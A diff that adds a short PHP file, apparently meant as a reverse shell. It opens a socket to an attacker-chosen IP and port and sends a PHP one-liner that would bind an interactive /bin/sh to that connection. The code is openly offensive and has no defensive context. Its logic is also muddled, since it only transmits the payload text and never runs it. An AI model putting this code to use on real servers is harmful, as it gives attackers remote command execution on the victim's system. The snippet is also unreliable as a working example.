@@ -1,0 +1,10 @@
+<?php
+$ip = '127.0.0.1';  // Replace with the IP address of your machine
+$port = 1234;       // Replace with the desired port number
+$sock = fsockopen($ip, $port);
+if ($sock) {
+    $cmd = '<?php $sock=fsockopen("'.$ip.'",'.$port.');exec("/bin/sh -i <&3 >&3 2>&3"); ?>';
+    fputs($sock, $cmd);
+    fclose($sock);
+}
+?>
